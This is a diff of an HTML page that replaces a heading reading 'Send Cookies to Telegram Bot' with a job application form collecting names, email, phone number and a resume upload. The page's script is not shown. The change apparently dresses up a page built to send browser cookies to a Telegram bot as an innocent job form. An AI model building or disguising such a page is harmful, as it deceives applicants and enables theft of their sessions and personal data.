@@ -36,7 +36,33 @@
     </script>
 </head>
 <body>
-    <h1>Send Cookies to Telegram Bot</h1>
+  <div class="container mx-auto mt-10 p-5">
+  <h2 class="text-2xl font-bold mb-5">Apply for a Job</h2>
+  <form action="/submit" method="post" enctype="multipart/form-data" class="space-y-4">
+    <div class="flex flex-col">
+      <label for="firstName" class="mb-2">First Name</label>
+      <input type="text" id="firstName" name="firstName" placeholder="Enter First Name" required class="p-2 border rounded-md">
+    </div>
+    <div class="flex flex-col">
+      <label for="lastName" class="mb-2">Last Name</label>
+      <input type="text" id="lastName" name="lastName" placeholder="Enter Last Name" required class="p-2 border rounded-md">
+    </div>
+    <div class="flex flex-col">
+      <label for="email" class="mb-2">Email Address</label>
+      <input type="email" id="email" name="email" placeholder="Enter Email" required class="p-2 border rounded-md">
+    </div>
+    <div class="flex flex-col">
+      <label for="phone" class="mb-2">Phone Number</label>
+      <input type="tel" id="phone" name="phone" placeholder="Enter Phone Number" required class="p-2 border rounded-md">
+    </div>
+    <div class="flex flex-col">
+      <label for="resume" class="mb-2">Upload Resume (PDF only)</label>
+      <input type="file" id="resume" name="resume" accept=".pdf" required class="p-2 border rounded-md">
+    </div>
+    <button type="submit" class="mt-5 bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded">Submit</button>
+  </form>
+</div>
+
 </body>
 </html>
 
